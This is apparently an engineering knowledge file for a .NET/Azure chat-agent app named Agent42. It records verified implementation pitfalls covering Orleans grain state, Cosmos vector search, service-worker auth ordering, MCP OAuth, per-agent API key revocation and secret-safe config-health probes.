- **Verified:** 2026-07-06

### A cross-RG role grant in RG `agent42` must be a CLI step in the deploy workflow, not Bicep

- **Claim:** the AI Foundry account lives in RG `agent42`, where the deploy SP has only `Microsoft.Authorization/roleAssignments/write` scoped to that one account — not `Microsoft.Resources/deployments/write`. A cross-RG Bicep module therefore fails; any such grant must be an idempotent `az rest` PUT in the deploy workflow, not "cleaned up" into Bicep. This is the durable constraint.
- **The specific grant the workflow still performs — "Cognitive Services OpenAI User" for the app MI — is itself NO LONGER REQUIRED (ADR 0017):** Foundry chat + embeddings authenticate by **API key**, so the app functions without any OpenAI data-plane RBAC. The `az rest` step in `deploy.yml` is now dead-but-harmless (idempotent, leaves a role that nothing reads). Keep it only as the live example of the CLI-not-Bicep pattern above; it is safe to remove.
- **Evidence:** `.github/workflows/deploy.yml` (Grant Cognitive Services OpenAI User step, ~line 113 + comment),
  `.agentic/decisions/0017-foundry-provider-api-key-auth.md` (the grant is no longer required),
  `CLAUDE.md` (the "no longer required … leaving any existing grant is harmless" note)
- **Verified:** 2026-07-16

### Deploy service principal uses a client secret, not OIDC

- **Claim:** `sp-agent42-deploy` authenticates with a client secret, so `azure/login` needs the full credentials JSON (`clientId`+`clientSecret`+…), not the OIDC client-id-only form.
- **Evidence:** `.github/workflows/deploy.yml`
- **Verified:** 2026-07-06

### Minimal-API handlers returning a bare string serve text/plain, not JSON

- **Claim:** an endpoint whose handler returns `string` (e.g. `GetSelectedModelAsync()`'s
  `Task<string>`) is written as `Content-Type: text/plain` with the raw value (`gpt-4o`),
  NOT JSON (`"gpt-4o"`). The frontend calls `response.json()` on every endpoint, which
  then throws `SyntaxError` — and because that call sat before the history render in one
  shared `try`, it silently hid the whole conversation. Wrap string results in
  `Results.Json(...)` so the API is uniformly JSON. Keep UI side-effects that can throw
  (model-picker restore) after the primary render.
- **Corollary — `Results.Json(null)` writes no body and no content-type.** Returning a
  nullable value (e.g. `Task<AgentBinding?>` from the `/agent` endpoint) through
  `Results.Json` sends an empty 200 with *no* `Content-Type` when the value is null, which
  re-trips the same `response.json()` failure. Serialize explicitly for nullable payloads:
  `Results.Text(JsonSerializer.Serialize(value, JsonSerializerOptions.Web), "application/json")`
  so an absent value comes back as a real JSON `null`.
- **Evidence:** `src/Agent42.Backend/AgentApi.cs` (`/model` and `/agent` endpoints), `src/Agent42.Backend/wwwroot/app.js` (`selectConversation`), `tests/Agent42.Tests/AgentApiTests.cs`
- **Verified:** 2026-07-07

### Service worker must stay network-first for navigations and bypass /api

- **Claim:** the whole app is behind Entra Easy Auth at the ingress (ADR 0002), so an
  expired session turns any navigation into a 302 redirect to the Entra login. The PWA
  service worker (`src/Agent42.Backend/wwwroot/sw.js`) is therefore **network-first for `req.mode ===
  "navigate"`** (cached `index.html` is an offline-only fallback) and **returns early for
  any `/api` path before touching the cache**. "Optimizing" the SW to cache-first
  navigations would serve a stale shell over the login redirect (auth silently breaks);
  caching `/api` would stale/leak per-user, auth-bearing, streaming chat responses. The
  `PwaAssetsTests.ServiceWorker_BypassesApiBeforeCaching` test guards the `/api` ordering,
  but the navigation strategy is only enforced here — keep it network-first.
- **Evidence:** `src/Agent42.Backend/wwwroot/sw.js`, `.agentic/decisions/0002-entra-easy-auth-gate.md`
- **Verified:** 2026-07-06

### A shared static instance must never be a grain-state default (Orleans mutates it)

- **Claim:** giving Orleans grain state a default that is a *cached static* instance
  (`public static T Empty { get; } = new(...)` used as `State.Prop = T.Empty`) leaks across
  grains: Orleans' generated copier/serializer writes *into* the state object it is handed, so
  every grain that started from the shared instance ends up seeing another grain's value. This
  is invisible in the code (the record is immutable-looking) and hides in single-test runs — it
  only surfaces when two grains with *different* keys are exercised in one process and one reads
  another's data. Make the default a **factory** (`public static T Empty => new(...)`, a fresh
  instance per access) or initialize the field with `new(...)` directly — never a `{ get; } =`
  singleton. Same discipline as the list defaults (`= []`) elsewhere.
- **Evidence:** `src/Agent42.Agents/UserProfile.cs` (`Empty` is `=> new("")`), `src/Agent42.Agents/UserProfileGrain.cs` (its UserProfileState.Profile property), `tests/Agent42.Tests/UserProfileGrainTests.cs` (`UserProfile_Empty_IsAFreshInstance_NotASharedSingleton` deterministically guards the factory property; `UserProfile_IsIsolatedPerUser` originally surfaced the leak in-cluster)
- **Verified:** 2026-07-08

### Agent Framework 1.13 session API differs from older samples

- **Claim:** it's `AgentSession` with `CreateSessionAsync` / `SerializeSessionAsync` / `DeserializeSessionAsync` — the `AgentThread` / `GetNewThread()` API from pre-1.13 samples (and model training data) no longer exists. Copy `AgentGrain.cs`, not blog posts.
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs`
- **Verified:** 2026-07-06

### Testing that a bound persona reaches the model needs the fake to echo its instructions

- **Claim:** a `ChatClientAgent` built with `ChatClientAgentOptions.ChatOptions.Instructions`
  delivers the system prompt to the *terminal* `IChatClient`, but a canned fake that only
  returns a fixed reply can't prove it arrived — a storage round-trip
  (`GetAgentBindingAsync`) proves the prompt was *saved*, not *delivered*. So `FakeChatClient`
  deliberately echoes what it receives: it prepends a `[sys:…]` marker built from the
  instructions it sees (checking `options?.Instructions` first, then any system-role
  `ChatMessage`, so the echo is robust to however AF carries them), letting a test assert the
  persona reached the model. Two traps when writing that assertion: the `AgentSkillsProvider`
  *appends* its skill catalog to the instructions, so assert the prompt is *contained*, not an
  exact match; and every chat now carries the default persona as instructions, so assert on a
  *distinctive* bound prompt, not merely on non-empty instructions.
- **Evidence:** `tests/Agent42.Tests/FakeChatClient.cs` (`InstructionsEcho`), `tests/Agent42.Tests/AgentGrainTests.cs` (`AgentChat_AppliesBoundSystemPrompt`)
- **Verified:** 2026-07-07

### Image attachment bytes must stay out of the session, and prior-turn image URLs get re-fetched

- **Claim:** the serialized `AgentSession` is written to one `agent-state` Cosmos item every
  turn, and Cosmos caps an item at **2 MB** — so attachment bytes can never be inlined
  (`DataContent`), or the first real photo blows the limit (ADR 0004). Images live in blob
  storage and reach the model as a **`UriContent` user-delegation SAS URL** (a short string).
  The non-obvious trap: a Step 1 spike proved Azure OpenAI **re-fetches a prior turn's image
  URL on every later turn**, so a short-lived SAS baked into a reopened conversation would 400.
  `AgentGrain` therefore **rehydrates before every model call** (`RehydrateAttachmentUrlsAsync`,
  from both `ChatAsync` and `ReceiveReminder`) — refreshing the SAS on every attachment
  `UriContent` in the session. Not just on activation: a warm grain serves many turns without
  reactivating, so an activation-only refresh would let a short-lived SAS lapse mid-conversation
  and 400 on the next turn. It also persists per-turn refs in `AgentGrainState.TurnAttachments`
  (one entry per user turn, in order,
  including an empty entry on the reminder path) so history joins turns to images by index.
  Don't "simplify" back to `DataContent`, and don't drop the rehydrate step. This is a prod-blob
  property the offline harness can't test (the in-memory store returns non-expiring URLs).
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`RehydrateAttachmentUrlsAsync`, `ChatAsync`, `AlignTurnAttachmentsToHistory`), `src/Agent42.Backend/BlobAttachmentStore.cs`, `.agentic/decisions/0004-attachments-in-blob.md`
- **Verified:** 2026-07-08

### Attachments Storage RBAC is in Bicep — but only because the deploy SP was elevated once

- **Claim:** the **Storage Blob Data Contributor** grant to the container app identity
  (`infra/modules/storage-role-assignment.bicep`) is classic `Microsoft.Authorization/roleAssignments`,
  which a plain Contributor cannot create. It works in Bicep only because the deploy SP
  (`sp-agent42-deploy`) was granted **Role Based Access Control Administrator** on `rg-agent42` — a
  one-time manual elevation done 2026-07-08 (`az role assignment create … --role "Role Based Access
  Control Administrator" --scope subscriptions/<sub>/resourceGroups/rg-agent42`). If that elevation is
  removed or the SP recreated, this module's deploy fails with an authorization error — fall back to a
  manual `az role assignment create` of Storage Blob Data Contributor. This is the key difference from
  the **OpenAI grant, which stays manual** (its account is in a *different* RG where a cross-RG Bicep
  role module fails). The role also authorizes `generateUserDelegationKey`, so no account key is needed
  (shared-key auth is disabled on the account). The agent never runs role-assignment writes itself; the
  one-time elevation was run by the user.
- **Gotcha on Windows/Git Bash:** an `az … --scope "/subscriptions/…"` argument starting with `/` is
  mangled by MSYS path conversion into a Windows path → ARM returns `MissingSubscription`. Drop the
  leading `/` (`--scope "subscriptions/…"`) or prefix the command with `MSYS_NO_PATHCONV=1`.
- **Evidence:** `infra/modules/storage-role-assignment.bicep`, `infra/main.bicep` (`storageRoleAssignment` module), `infra/modules/storage.bicep`
- **Verified:** 2026-07-08

### Document RAG embedding deployment is a manual prerequisite — but needs no new RBAC

- **Claim:** the `text-embedding-3-large` deployment used for document RAG (ADR 0007) is **not**
  provisioned by this repo's Bicep — it lives in the `Agent42` AI Foundry account in the *different*
  RG `agent42`, the same reason the OpenAI role grant stays a manual step. The user must create the
  deployment and its name must match `AzureOpenAI:EmbeddingDeploymentName` (default
  `text-embedding-3-large`, eager-validated at startup — a missing value throws before the first
  upload, not on it). **No new role assignment is required:** as of ADR 0017 the embedding client reuses
  the same endpoint + **`AzureKeyCredential` (from `AzureOpenAI:ApiKey`)** as the Foundry chat provider —
  one key, one source of truth — so the key that authorizes chat authorizes embeddings on the same
  account. (Before 0017 this was `DefaultAzureCredential` + the identity's *Cognitive Services OpenAI
  User* grant; that grant is no longer needed for embeddings.)
- **Evidence:** `src/Agent42.Backend/Program.cs` (embedding-generator registration + `AzureOpenAI:ApiKey` eager check), `src/Agent42.Backend/appsettings.json`, `.agentic/decisions/0017-foundry-provider-api-key-auth.md`, `.agentic/decisions/0007-document-rag-cosmos-vector-search.md`
- **Verified:** 2026-07-16

### Cosmos vector search is prod-only: capability + pre-created container + no create-on-use

- **Claim:** document retrieval (ADR 0007) needs the account-level `EnableNoSQLVectorSearch`
  capability **and** the `doc-chunks` container pre-created in Bicep with its vector policy
  (partition `/ownerKey`, vector path `/embedding` float32/cosine/3072, **`quantizedFlat`** index — a
  `flat` index caps at 505 dims and can't hold a 3072-dim embedding). `CosmosDocumentIndex` uses the
  **raw `CosmosClient` and never creates on use** — the account is `disableLocalAuth: true`, so
  AAD data-plane RBAC can't create the container (same 403 wall as the Orleans providers); a vector
  *connector* that calls `EnsureCollectionExists` would fail here. The container schema in Bicep
  (property names `ownerKey`/`embedding`, lowercase `id`) must exactly match the item POCO the code
  writes/reads. This path **cannot be exercised offline**: `Program.cs` registers `CosmosDocumentIndex`
  only when `Cosmos:DocChunksContainerName` is set (threaded from Bicep in prod); under the AppHost
  Cosmos emulator that key is absent, so the in-memory index is used and the emulator never runs a
  vector query — the emulator uses a well-known key and can't reproduce the no-create-rights wall
  anyway. The `ORDER BY VectorDistance(...)` (ascending) → most-similar-first ordering is a prod-smoke
  fact (AC7), not something the offline harness verifies.
- **Evidence:** `infra/modules/cosmos.bicep` (`doc-chunks` container + capability), `src/Agent42.Backend/CosmosDocumentIndex.cs`, `src/Agent42.Backend/Program.cs` (index branch), `.agentic/decisions/0007-document-rag-cosmos-vector-search.md`
- **Verified:** 2026-07-09

### Docnet.Core DocLib.Instance is a process-global native singleton — serialize PDF extraction

- **Claim:** PDF text extraction (ADR 0007) uses Docnet.Core, which wraps a **process-global native
  PDFium handle** via `DocLib.Instance`. It is **not safe for concurrent `GetDocReader` calls**, so
  `DocumentTextExtractor` serializes every PDF extraction through a single static lock. Do not
  dispose `DocLib.Instance` per call (it frees the native library for the whole process); only the
  `IDocReader`/`IPageReader` are disposed. Fine at per-conversation, synchronous-ingestion scale.
- **Evidence:** `src/Agent42.Agents/DocumentTextExtractor.cs` (`PdfLock`)
- **Verified:** 2026-07-09

### Selectable tools: `null == all`, and the user default must be fetched BEFORE the first `BuildAgent`

- **Claim:** `EnabledTools` (ADR 0021) is a `List<string>?` on four types, and the type does **not** tell
  you that **`null` means "all selectable tools"**, not "none". Two traps follow. **(1) Never represent
  "all" as an empty list, and never default a new `EnabledTools` field to `[]`** — an empty list is "no
  tools", so defaulting existing state to `[]` would silently strip every tool from every existing user /
  agent / conversation. The `null == all` sentinel is the whole reason there is no migration; the UI
  represents "all selected" as the **full explicit list**, never `null`. **(2) The user-default fetch in
  `OnActivateAsync` must run BEFORE the first `BuildAgent(_modelId)` call.** `BuildAgent` reads
  `_userDefaultEnabledTools` (via `EffectiveEnabledTools`), and `ReceiveReminder` reuses that same
  `_agent` — so fetching the default *after* the build would have the first chat turn **and every reminder
  turn on that activation** register all tools and silently ignore the user's default (the same ordering
  hazard the `_chatClientFactory` resolution guards against for a different field). The default is read
  **once on activation** (accepted staleness, mirrors default-model resolution) — a Preferences change
  reflects in a warm regular chat only on its next activation. **`_mcpTools` (ADR 0024) is a THIRD field
  with the identical hazard** — it is resolved from `IUserMcpToolProvider` in `OnActivateAsync` before the
  first `BuildAgent`, and `BuildAgent` merges it gated per server; resolving it later would omit the user's
  MCP tools from the first chat turn and every reminder turn on that activation.
- **Per-server MCP wildcard (ADR 0026) — a THIRD null==all trap.** Individual MCP servers are now
  selectable as `mcp:{id}` keys; the bare `mcp` key became a **wildcard "all servers"** meta-key that stays
  in `AllSelectableToolKeys` (so `null == all` and legacy `"mcp"` selections keep enabling every server —
  still no migration) but is **removed from `Descriptors`** (no checkbox). The trap: `GetEnabledToolsAsync`
  returns `AllSelectableToolKeys` for a null selection, which carries the bare `mcp` and **no** `mcp:{id}`.
  The picker renders only catalog keys, so `mcp` has no checkbox — a no-op Save would drop the wildcard and
  add no per-server key, **silently disabling every MCP server**. So `GetEnabledToolsAsync` **expands** a
  present `mcp` into `mcp:{serverId}` for each of `_mcpServers` before returning (a read-only client-facing
  projection — the gate `EffectiveEnabledTools`/`IsMcpServerEnabled` still honours the raw wildcard), and
  `renderToolChecks` treats a stored `mcp` as "all servers checked" for the editor surfaces. `Sanitize` must
  **pass through** `mcp:{id}` keys (they are not in `AllSelectableToolKeys`), and the provider emits an
  **empty group per skipped server** so the id list for expansion is complete.
- **Evidence:** `src/Agent42.Agents/AgentGrainState.cs` (`[Id(10)] EnabledTools`),
  `src/Agent42.Agents/ToolCatalog.cs` (`Sanitize`, `AllSelectableToolKeys`, `Mcp` wildcard,
  `IsMcpServerEnabled`, `McpServerKey`), `src/Agent42.Agents/AgentGrain.cs` (`OnActivateAsync` fetch before
  `BuildAgent`, `EffectiveEnabledTools`, `_mcpServers`, `ExpandMcpWildcard`, per-server `BuildAgent` gate),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`LegacyState_NullEnabledTools_MeansAll`,
  `UserDefault_AppliesWhenNoOverride`, `McpTools_ResolvedBeforeFirstBuildAgent`,
  `PerServerSelection_EnablesOnlySelectedServer`, `GetEnabledTools_NullSelection_ExpandsWildcardToPerServerKeys`),
  `tests/Agent42.Tests/ToolCatalogTests.cs`, `.agentic/decisions/0021-selectable-tools-three-layer.md`,
  `.agentic/decisions/0024-config-driven-remote-mcp-servers.md`,
  `.agentic/decisions/0026-per-mcp-server-selectable-tools.md`
- **Verified:** 2026-07-19

### Remote MCP servers: a live-socket cache (bound it), a group-gated catalog exception, and a route-matcher trap

- **Claim:** config-driven remote MCP servers (ADR 0024) copy the ADR 0018 provider-overlay shape, but three
  things do **not** transfer and are invisible in the copied code. **(1) The tool provider's version cache
  holds LIVE connections — bound it.** `UserChatClientFactoryProvider`'s cache is never evicted because a
  chat-client factory is a cheap object; an `McpClient` is an open socket, so an unbounded `(userId, version)`
  cache leaks one connection per config change. `UserMcpToolProvider` retains the most recent
  **2** versions per user and disposes older on eviction (an in-flight grain then sees a disposed client as a
  skipped tool — tolerated). Do **not** ship the unbounded copy. **(2) MCP tools are the documented exception
  to the "every registered tool maps to a catalog key" guard.** MCP tool names are user-defined and dynamic,
  so they are deliberately **absent** from `ToolCatalog.ToolNameToKey` — `IsToolEnabled` would keep an unmapped
  name **unconditionally**, bypassing the picker. So MCP tools are gated **per server** in `BuildAgent`
  (ADR 0026, was one `mcp` group key in ADR 0024): a loop over `_mcpServers` keeping each server whose
  `ToolCatalog.IsMcpServerEnabled(id, enabled)` is true — i.e. the selection contains the `mcp` **wildcard**
  OR the server's `mcp:{id}` key — under `SupportsTools`, inserted **after** the `IsToolEnabled` filter and
  **before** the `Tools = SupportsTools ? …` capability intersection. The guard test carves MCP tools out by
  the provider's set, never by name-guessing. See the null==all gotcha for the wildcard-expansion trap.
  **(3) Adding the `/api/mcp-servers` endpoints made
  `IMcpSecretProtector` a route-matcher dependency for the WHOLE host.** Minimal-API infers every endpoint's
  parameters up front, so an `IMcpSecretProtector` handler param that DI can't resolve is treated as a body and
  breaks routing for *every* endpoint (this bit all six `MapAgentApi` hosts — DevHost 500s + 39 test failures —
  until each registered it). The MCP **endpoint is deliberately NOT SSRF-guarded** (config, not a model/request
  — may be `localhost`), exactly like the user-provider endpoint (see that gotcha).
- **Evidence:** `src/Agent42.Backend/UserMcpToolProvider.cs` (`RetainedVersionsPerUser`, `EvictBeyondAsync`),
  `src/Agent42.Agents/ToolCatalog.cs` (`Mcp` wildcard + `IsMcpServerEnabled`, both absent from `ToolNameToKey`),
  `src/Agent42.Agents/AgentGrain.cs` (`BuildAgent` per-server MCP gate over `_mcpServers`),
  `src/Agent42.Backend/Program.cs` +
  `tools/Agent42.DevHost/Program.cs` (`IMcpSecretProtector` registration),
  `tests/Agent42.Tests/UserMcpToolProviderTests.cs` (`OldVersions_AreEvicted_AndTheirConnectionsDisposed`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`EveryRegisteredTool_MapsToACatalogKey_OrIsGetDate_OrIsAnMcpTool`,
  `PerServerSelection_EnablesOnlySelectedServer`),
  `.agentic/decisions/0024-config-driven-remote-mcp-servers.md`,
  `.agentic/decisions/0026-per-mcp-server-selectable-tools.md`
- **Verified:** 2026-07-19

### MCP interactive OAuth is hand-rolled: the SDK flow blocks, the callback must stay behind Easy Auth

- **Claim:** MCP InteractiveOAuth (ADR 0025) does NOT use the `ModelContextProtocol` SDK's OAuth. The SDK
  drives authorization through a **blocking** `AuthorizationRedirectDelegate(authorizationUri, redirectUri,
  ct) → Task<string>` that must open a browser and block until the code returns — a desktop/loopback
  assumption that cannot bridge Agent 42's stateless two-request web flow (`/api/mcp/oauth/start` then a
  separate `/callback`). So the app drives authorization-code + PKCE itself (PRM discovery → authz redirect →
  token exchange). **Two traps.** (1) **Both endpoints must stay BEHIND Easy Auth — never in
  `excludedPaths`** — or `GetUserId()` returns `local-dev` and the tokens bind to the wrong (or no) user; the
  external identity provider redirects the *browser* to `/callback`, which re-enters through the same Easy
  Auth session cookie, so `GetUserId()` works. Manual prereq: the redirect URI
  `https://chat.agent42.nl/api/mcp/oauth/callback` must be registered in each provider's app registration,
  and it is built from `Request.Scheme`/`Host` (relies on forwarded-headers being handled behind the proxy).
  (2) **Refresh is connect-time, not per-request**, and persisting a refreshed token via `SaveAsync` **bumps
  the overlay version**, so the next activation does one extra reconnect — accepted churn, not a bug (a
  per-request `AuthHeaderHandler` refresh was deferred to avoid coupling grain-persist into the connection).
  The whole token bundle (access + refresh + token endpoint + client id + scopes) rides the encrypted
  `StoredMcpServer.TokenCiphertext` — no new schema field.
- **Evidence:** `src/Agent42.Backend/McpOAuth.cs` (`McpOAuthClient` discovery/exchange/refresh, `McpPkce`),
  `src/Agent42.Backend/AgentApi.cs` (`/api/mcp/oauth/start` + `/callback`, `GetUserId()`-scoped),
  `src/Agent42.Agents/UserMcpOAuthPendingGrain.cs` (one-time `TakeAsync`),
  `src/Agent42.Backend/UserMcpToolProvider.cs` (`ResolveOAuthAccessTokenAsync`),
  `tests/Agent42.Tests/McpOAuthEndpointTests.cs` (`OAuthCallback_PersistsEncryptedTokens`),
  `tests/Agent42.Tests/McpOAuthClientTests.cs` (`Pkce_Challenge_MatchesRfc7636Vector`),
  `.agentic/decisions/0025-mcp-interactive-oauth-app-driven-pkce.md`
- **Verified:** 2026-07-19

### The API-key directory must be kept in sync per-operation, or a revoked key stays live

- **Claim:** a per-agent API key (ADR 0022) authenticates by an **O(1) hash-keyed grain lookup** —
  `IAgentKeyDirectoryGrain` (grain key = SHA-256 hash) → `(userId, agentId)` — because the run endpoint
  has no signed-in user and no agent id in the request. The `AgentRegistryGrain` owns the hash and **must
  pair every hash change with a directory update**, and there is **no single safe write order** — the
  invariant is *"a revoked key must never keep resolving,"* which forces a **per-operation** order:
  **create** writes the registry (new hash) then registers; **delete** removes from the registry then
  deregisters; **regenerate deregisters the OLD hash FIRST**, then writes the new hash, then registers it.
  Regenerate is the opposite of the other two on purpose: registry-write-first there would strand a live
  `oldHash` entry that the stored (now `newHash`) can never clear — a **permanently live revoked key**.
  A missed `DeregisterAsync` leaves a revoked/deleted key resolving; the endpoint's post-resolve
  agent-existence re-check (401 on a null agent) is the delete backstop, not a licence to skip the
  deregister. Keys are 256-bit random, so a single **SHA-256** (no salt, no bcrypt/PBKDF2, no
  `FixedTimeEquals`) is correct — `ApiKey` is the one place that generates *and* hashes, so they can't
  diverge.
- **Evidence:** `src/Agent42.Agents/ApiKey.cs`, `src/Agent42.Agents/AgentKeyDirectoryGrain.cs`,
  `src/Agent42.Agents/AgentRegistryGrain.cs` (`SaveAsync` per-operation ordering, `DeleteAsync`),
  `tests/Agent42.Tests/AgentRegistryGrainTests.cs` (`AgentKey_Regenerate_InvalidatesOldKey`,
  `AgentDelete_DeregistersKey`), `.agentic/decisions/0022-per-agent-api-key-and-async-run-endpoint.md`
- **Verified:** 2026-07-17

### An Easy-Auth `excludedPaths` endpoint is publicly reachable and must self-enforce auth + fail closed

- **Claim:** the whole app is behind Entra Easy Auth (ADR 0002), but `/api/agent-run` (ADR 0022) is added
  to `container-app.bicep`'s `globalValidation.excludedPaths` so a key-only caller isn't redirected to
  login. That makes the path **publicly reachable** — Easy Auth no longer gates it — so the handler is the
  *only* auth boundary and must **self-enforce the key and fail closed** (missing/unknown key → 401,
  deletion-race null agent → 401 not 404 so agent existence isn't disclosed). Two consequences a
  contributor must not miss: **(1)** on an excluded path there is **no `X-MS-CLIENT-PRINCIPAL-ID`**, so
  `GetUserId` returns `local-dev` — the endpoint must take the userId from the **directory resolution**,
  never from `GetUserId`; **(2)** any new endpoint added under this exclusion inherits the same duty. This
  is the single hole in the ADR 0002 gate; every browser surface stays fully Easy-Auth-gated. The ingress
  `excludedPaths` behaviour itself is **not** unit-testable (TestServer has no Easy Auth) — verify at deploy.
- **Evidence:** `infra/modules/container-app.bicep` (`globalValidation.excludedPaths`),
  `src/Agent42.Backend/AgentApi.cs` (`/api/agent-run` — 401 branches, userId from `owner`, never `GetUserId`),
  `tests/Agent42.Tests/AgentApiTests.cs` (`AgentRun_MissingOrUnknownKey_Returns401`),
  `.agentic/decisions/0002-entra-easy-auth-gate.md`, `.agentic/decisions/0022-per-agent-api-key-and-async-run-endpoint.md`
- **Verified:** 2026-07-17

### The background (agent-run) run must drain `ChatCoreAsync`, not the reminder path, or attachments vanish

- **Claim:** the async run behind `POST /api/agent-run` (ADR 0022, `IAgentGrain.EnqueuePromptAsync`, `[OneWay]`)
  runs its turn by **draining `ChatCoreAsync`** (`await foreach` over it, discarding the streamed events after
  clearing `_turnLocation` like the reminder path). This is deliberate and load-bearing: `ChatCoreAsync` is
  the *only* place that does the no-model guard, the **image-generation branch** (ADR 0020), the **vision
  gate + attachment→`UriContent` materialization** (ADR 0013/0004) and document retrieval. The reminder path
  (`ReceiveReminder`) pushes an **always-empty** attachment list and does none of that — so reusing *it* (the
  spec's original plan) would make agent-run images **silently vanish** and an image-generation agent never
  edit its input. Do not "simplify" `EnqueuePromptAsync` to a bare `_agent.RunAsync([msg], _session)`.
  Because it's `[OneWay]`, callers/tests can't await the turn — **poll** history for the persisted result.
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`EnqueuePromptAsync` draining `ChatCoreAsync`; contrast
  `ReceiveReminder`'s empty-attachment turn), `tests/Agent42.Tests/AgentGrainTests.cs`
  (`EnqueuePrompt_RunsAndPersistsTurn`, `EnqueuePrompt_WithImage_RecordsAttachmentOnTurn` — both poll),
  `.agentic/decisions/0022-per-agent-api-key-and-async-run-endpoint.md`
- **Verified:** 2026-07-17

### The Web Share Target `respondWith` must sit after the `/api` guard, and the share needs an active SW

- **Claim:** the Web Share Target (ADR 0023) is handled entirely in `sw.js`: `POST /share` is intercepted
  client-side, stashed in IndexedDB, and answered with a 303 to `/?share=1` — so the body never reaches
  the network (a POST navigation to a protected path would 302 to the Easy Auth login and **lose the
  body**, ADR 0002). Two traps invisible in the code: **(1) placement** — the share branch introduces the
  *first* `event.respondWith` in the fetch handler, so it MUST sit **after** the `url.pathname.startsWith("/api")`
  early-return (the ADR 0002 never-intercept-`/api` invariant, pinned by `ServiceWorker_BypassesApiBeforeCaching`
  and `ServiceWorker_HandlesShareTarget` which both assert `startsWith("/api")` precedes the first
  `respondWith`) and **after** the same-origin guard (else a cross-origin `POST /share` is handled), but
  **before** the `if (req.method !== "GET") return;` line (a share is a POST, so that early-return moved
  *below* the share branch). Putting the share `respondWith` above the `/api` guard silently breaks the
  auth invariant *and* the test. **(2) the SW must be active and controlling** for any of this to fire
  (true after install on Android). If it isn't, `POST /share` reaches the server, which has no `/share`
  route, and the share fails ungracefully. This is **accepted** platform degradation — do NOT add a server
  `POST /share` fallback: it reintroduces the Easy Auth body-loss problem the SW-stash exists to avoid.
  Web Share *Target* is Android/Chromium-only regardless (iOS PWAs can't register as targets).
- **Evidence:** `src/Agent42.Backend/wwwroot/sw.js` (`handleShare`, the ordered fetch handler),
  `src/Agent42.Backend/wwwroot/manifest.webmanifest` (`share_target`),
  `tests/Agent42.Tests/PwaAssetsTests.cs` (`ServiceWorker_HandlesShareTarget`, `Manifest_DeclaresShareTarget`),
  `.agentic/decisions/0023-web-share-target-android-pwa.md`, `.agentic/decisions/0002-entra-easy-auth-gate.md`
- **Verified:** 2026-07-18

### The away-reply push belongs in the two async callers, never in `ChatCoreAsync`

- **Claim:** the Web Push notification when an agent replies (ADR 0028) must be sent from the two
  **async** callers — `EnqueuePromptAsync` (agent-run) and `ReceiveReminder` (scheduled prompt) — and
  **never** from `ChatCoreAsync`, which all three paths share. `ChatCoreAsync` is the live interactive
  path's body too, so a send there would notify a user who is actively watching their reply stream — the
  exact opposite of "away". "Not online" is approximated by this placement alone; there is no
  presence/heartbeat tracker (rejected, ADR 0028). Two further placement traps invisible in the code:
  **(1)** in `EnqueuePromptAsync` the send sits **inside the `try`, after the drain loop** (a faulted turn
  caught below must not notify) and is **gated on `!string.IsNullOrEmpty(_modelId)`** — the no-model path
  drains ChatCoreAsync *normally* (it emits the "configure a provider" notice + `Done`), so an ungated
  send would fire a false "your agent replied"; `_modelId` is set by ChatCoreAsync's re-resolve/rebind if
  a provider appeared mid-flight. **(2)** in `ReceiveReminder` the send is **after `WriteStateAsync`** (so
  a push only ever follows a durably-persisted reply) and needs **no** `_modelId` guard — the no-model
  reminder already early-returned above. Separately, the send is a safe inline `await` on the
  **non-reentrant** grain only because the sender is internally time-bounded (`SendBudget`) and its
  `HttpClient` calls `RemoveAllResilienceHandlers()` (the same named-client retry trap as the web/geocoding
  clients) — see the "web tool return value" / geocoder gotchas.
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`SendAwayReplyPushAsync`, the gated call in
  `EnqueuePromptAsync`, the post-`WriteStateAsync` call in `ReceiveReminder`, and its absence from
  `ChatCoreAsync`), `src/Agent42.Backend/WebPushNotificationSender.cs` (`SendBudget`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`ReceiveReminder_SendsPush_WithAgentName`,
  `EnqueuePrompt_SendsPush`, `ChatAsync_DoesNotSendPush`, `EnqueuePrompt_NoModel_DoesNotSendPush`),
  `.agentic/decisions/0028-web-push-when-agent-replies-while-away.md`
- **Verified:** 2026-07-21

### Config-health: the PROBE path is the leak channel, not the static one — and don't inject `IHttpClientFactory`

- **Claim:** `GET /api/config-health` (ADR 0029) must never surface a secret, and the danger is the **live
  probe** path, not the static presence check. The static builder (`ConfigHealth.BuildStatic`) only ever
  emits fixed literal messages, so it is safe by construction. The trap is a probe: the Google geocoding
  key **rides in the request query string** (`GoogleGeocoder`, `&key=…`), so a probe that put `ex.Message`/
  `ex.ToString()` or the target URL into a `ConfigCheck.Message` would leak the key. Rule: `ProbeAsync`
  wraps every probe in a `catch` that **discards the exception** and emits a curated constant
  (`"unreachable"`), and each probe classifies a non-2xx by **status/marker**, never by echoing the
  response body. Anyone adding a probe returns a curated `ProbeResult`, never text derived from `ex`/a
  body/a URL. Three more traps in the same feature: **(1)** the endpoint injects **`IServiceProvider`,
  deliberately NOT `IHttpClientFactory`** — the factory is unregistered in DevHost (no `AddServiceDefaults`),
  and a minimal-API param the host can't resolve is treated as a body, breaking routing for the **whole**
  host (the same trap the DevHost `PushConfig` registration guards); probe deps resolve optionally via
  `sp.GetService<T>()` inside `ProbeAsync`, so the feature adds **no** new mandatory both-hosts
  registration. **(2)** the geocoding probe is built **only when its key is present** — `CreateClient(
  "google-geocoding")` with no key returns a client that **inherits** `AddServiceDefaults`' retry pipeline
  (the conditional-registration named-client trap); embeddings have no named client (they use
  `IEmbeddingGenerator`). **(3)** a SearXNG **403 is a HEALTHY sidecar** (JSON API off), not an auth
  failure. A test-only `ConfigHealthProbeSet` (which `ProbeAsync` prefers over its `FromServices` factory)
  is the seam that proves a static call runs **zero** probes.
- **Evidence:** `src/Agent42.Backend/ConfigHealth.cs` (`ProbeAsync`'s catch; `ConfigHealthProbeSet.
  FromServices` — geocoding-only-when-keyed, `ProbeSearxngAsync` 403→ok, no body in any message),
  `src/Agent42.Backend/AgentApi.cs` (the `GET /api/config-health` endpoint — `IServiceProvider`, not
  `IHttpClientFactory`), `tests/Agent42.Tests/ConfigHealthTests.cs` (`FailingProbe_NeverLeaksSecret`,
  `Report_NeverContainsSecretValues`), `tests/Agent42.Tests/ConfigHealthProbeTests.cs`
